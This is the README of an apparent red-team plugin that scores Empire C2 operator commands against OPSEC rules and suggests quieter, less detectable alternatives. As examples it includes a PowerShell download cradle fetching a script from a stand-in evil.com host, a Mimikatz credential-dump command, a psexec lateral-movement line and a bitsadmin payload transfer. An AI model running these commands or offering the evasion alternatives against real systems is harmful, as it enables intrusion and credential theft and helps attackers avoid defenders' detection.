# Empire Advisor

**OPSEC scoring and suggestion engine for Empire C2 commands**

⚠️ **Authorized use only** — See [AUTHORIZED_USE.md](AUTHORIZED_USE.md) for usage boundaries.

## Overview

Empire Advisor is a pre-execution advisory plugin for Empire C2 that evaluates operator commands against OPSEC heuristics and suggests quieter tradecraft alternatives from a local knowledge base. The tool keeps humans in control — it never auto-executes suggested alternatives.

### Key Features

- **Transparent scoring engine**: Deterministic rules from `rules.yaml` with documented rationales
- **Local knowledge base**: Suggests alternative commands with citations (no live exploit generation)
- **Advisory-only operation**: Warn/allow/block states without automatic execution
- **Offline fixture mode**: Works without live Empire C2 for testing and training
- **Plugin-compatible architecture**: Designed for Empire 4.x+ plugin API

## Empire Compatibility

### Supported Versions

- **Empire 4.0+**: Plugin API compatible (requires manual hook integration)
- **Empire 3.x**: Not directly compatible (use standalone shim mode)

### Integration Modes

1. **Empire Plugin Mode** (requires Empire 4.x installation):
   - Copy entire directory to `<empire>/plugins/empire-advisor/`
   - Load via Empire plugin manager
   - Manually invoke advisor before executing risky commands

2. **Standalone Shim Mode** (no Empire required):
   - Use `empire_plugin.py` StandaloneShim for testing
   - Process fixture command files offline
   - Suitable for training and acceptance testing

### Shim Limitations

The standalone shim provides an Empire-like interface for testing without full Empire:

- ✅ Full scoring engine functionality
- ✅ Knowledge base suggestion system
- ✅ Fixture-based batch evaluation
- ✅ JSON and human-readable output
- ❌ No live Empire C2 session interaction
- ❌ No automatic command interception hooks
- ❌ No Empire agent context (session info, OS detection)

For production use, operators must manually invoke the advisor or modify Empire core to add pre-execution hooks.

## Installation

### Prerequisites

```bash
# Python 3.8+
python3 --version

# Required packages
pip install pyyaml
```

### Setup

```bash
# Clone or extract to Empire plugins directory
cd <empire>/plugins/
git clone <repo-url> empire-advisor

# Or for standalone testing
cd empire-advisor/
python3 test_advisor.py
```

## Usage

### Standalone Command Evaluation

```bash
# Evaluate a single command
python3 empire_advisor.py "Invoke-Mimikatz -DumpCreds"

# Process fixture file
python3 empire_advisor.py --fixture testdata/fixture_commands.txt
```

### Shim Demo

```bash
# Run standalone shim demo
python3 empire_plugin.py
```

### Empire Plugin (Manual Integration)

```python
# In Empire console (after loading plugin)
(Empire) > plugin empire-advisor evaluate "psexec \\target cmd"
```

### Programmatic Use

```python
from empire_advisor import EmpireAdvisor

advisor = EmpireAdvisor()
result = advisor.evaluate_command("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')")

print(f"Score: {result.score}")
print(f"Risk: {result.risk_level}")
print(f"Advisory: {result.advisory_state}")

for suggestion in result.suggestions:
    print(f"Alternative: {suggestion['suggestion']}")
```

## Scoring Engine

### Rule Structure

Each rule in `rules.yaml` defines:

- **ID**: Unique identifier (e.g., `R001`)
- **Name**: Human-readable rule name
- **Pattern**: Regex pattern to match commands
- **Rationale**: Why this technique is risky (detection vectors, telemetry)
- **Severity**: `critical` (100), `high` (75), `medium` (50), `low` (25)
- **Category**: MITRE ATT&CK tactic alignment

### Advisory States

| Score Range | Advisory State | Description |
|------------|---------------|-------------|
| ≥100       | `block`       | Critical risk — strongly discourage execution |
| 50-99      | `warn`        | High/medium risk — review alternatives |
| 1-49       | `allow`       | Low risk — proceed with caution |
| 0          | `allow`       | Minimal risk — no rule matches |

### Determinism

The scoring engine is **fully deterministic**:
- Same command → same score every time
- No randomness, no external API calls
- Suitable for testing, training, and audit trails

## Knowledge Base

### Structure

`knowledge_base.yaml` maps rule violations to quieter alternatives:

```yaml
- rule_id: R002
  suggestion: "Use BITS transfer instead of WebClient"
  kb_citation: "BITS blends with Windows Update traffic"
  alternative_commands:
    - "bitsadmin /transfer job /priority high https://... C:\\temp\\payload"
```

### Citation Policy

Every suggestion includes:
- **Rationale**: Why the alternative is quieter
- **KB Citation**: Documented source (MITRE ATT&CK, detection research)
- **Concrete commands**: Copy-paste ready alternatives (operator validation required)

## Testing

### Run Acceptance Tests

```bash
# Full test suite
python3 test_advisor.py

# Results saved to testdata/test_results.json
```

### Acceptance Criteria

See [ACCEPTANCE.md](ACCEPTANCE.md) for complete criteria. Key checks:

- ✅ A1-A10: All acceptance criteria
- ✅ M1-M3: Manual fidelity checks
- ✅ Deterministic scoring
- ✅ Offline fixture mode
- ✅ Suggestion quality

### Fixture Commands

Test commands in `testdata/fixture_commands.txt` cover:
- Critical severity (credential dumping, domain enumeration)
- High severity (download cradles, lateral movement)
- Medium severity (WMI, persistence)
- Low severity (network recon)
- Clean commands (no matches)

## Security Considerations

### Detection Recommendations

See [OPSEC_CARD.md](OPSEC_CARD.md) for full operator guidance.

**Key points**:
- Advisor suggestions reduce but do not eliminate detection risk
- Always validate alternatives in lab environment first
- Consider defender capabilities (EDR, SIEM, behavioral analytics)
- Combine with proper C2 infrastructure and operational timing

### Authorized Use Only

This tool exists for **authorized security testing, research, and education**. Required boundaries:

- ✅ Use on systems you are contractually/legally authorized to test
- ✅ Lab/CTF/research environments
- ✅ Red team engagements with proper authorization
- ❌ Unauthorized penetration testing
- ❌ Malicious use against production systems

See [AUTHORIZED_USE.md](AUTHORIZED_USE.md) for complete usage boundaries.

## Architecture

```
empire-advisor/
├── empire_advisor.py        # Core scoring engine
├── empire_plugin.py         # Empire plugin + standalone shim
├── rules.yaml              # Scoring rules (12 rules)
├── knowledge_base.yaml     # Alternative suggestions
├── test_advisor.py         # Acceptance test suite
├── testdata/
│   ├── fixture_commands.txt
│   └── test_results.json
├── README.md
├── ACCEPTANCE.md
├── OPSEC_CARD.md
└── AUTHORIZED_USE.md
```

## Limitations

### Known Constraints

1. **No auto-execution**: Operator must manually apply suggestions
2. **No automatic hooks**: Empire core doesn't expose pre-execution hooks by default
3. **Pattern-based detection**: Rules use regex patterns (not semantic analysis)
4. **Static knowledge base**: Alternatives are pre-defined (not generated)
5. **No context awareness**: Doesn't consider target environment specifics

### Future Enhancements

- Empire 5.x hook integration (when available)
- MITRE ATT&CK technique tagging
- Target environment profiles (EDR vendor detection)
- Historical command analysis
- Team knowledge base contributions

## Contributing

This tool is part of a research study comparing AI coding scaffolds. See study methodology for contribution guidelines.

## License

See study licensing terms. Outputs subject to authorized use boundaries.

## References

- [Empire C2](https://github.com/BC-SECURITY/Empire)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [OPSEC Considerations for Offensive Security](https://www.offensive-security.com/offsec/opsec-considerations/)

## Support

For issues related to:
- **Empire compatibility**: Check Empire version and plugin directory structure
- **Rule false positives**: Review `rules.yaml` patterns
- **Missing suggestions**: Extend `knowledge_base.yaml` with new alternatives
- **Test failures**: Check `testdata/test_results.json` for details

---

**Remember**: This is an advisory tool. Operator judgment and proper authorization are required for all security testing activities.
